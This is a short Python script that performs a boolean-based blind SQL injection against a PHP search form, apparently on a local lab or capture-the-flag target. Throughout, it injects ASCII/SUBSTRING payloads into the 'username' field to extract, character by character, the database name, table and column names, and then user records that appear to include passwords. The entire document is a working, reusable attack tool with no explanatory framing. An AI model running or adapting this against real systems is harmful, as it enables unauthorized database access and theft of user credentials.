import requests

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

def test(payload):
    r = requests.post(URL, data={"username": payload}, cookies=COOKIES, timeout=2)
    return "No results" not in r.text

def char_at(query, pos):
    l, h = 32, 126
    while l <= h:
        m = (l + h) // 2
        if test(f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{m}-- "):
            l = m + 1
        else:
            h = m - 1
    if l <= 126 and test(f"' AND ASCII(SUBSTRING(({query}),{pos},1))={l}-- "):
        return chr(l)
    return None

def extract(query, max_len=25):
    result = ""
    for i in range(1, max_len + 1):
        c = char_at(query, i)
        if not c or ord(c) < 32:
            break
        result += c
    return result

# Extract database name
db = extract("SELECT database()")
print(f"Database: {db}")

# Extract first table
t1 = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT 0,1")
print(f"Table 1: {t1}")

# Extract second table
t2 = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT 1,1")
print(f"Table 2: {t2}")

# Extract columns
c1 = extract(f"SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1")
c2 = extract(f"SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1")
c3 = extract(f"SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 2,1")
print(f"Columns: {c1}, {c2}, {c3}")

# Extract user data
print("\nUsers:")
for i in range(5):
    u = extract(f"SELECT {c1} FROM users LIMIT {i},1", 40)
    p = extract(f"SELECT {c2} FROM users LIMIT {i},1", 40)
    if u:
        print(f"  {c1}: {u}, {c2}: {p}")
        if 'beta' in u.lower() or 'beta' in p.lower():
            print(f"    >>> BETA USER FOUND")
    else:
        break

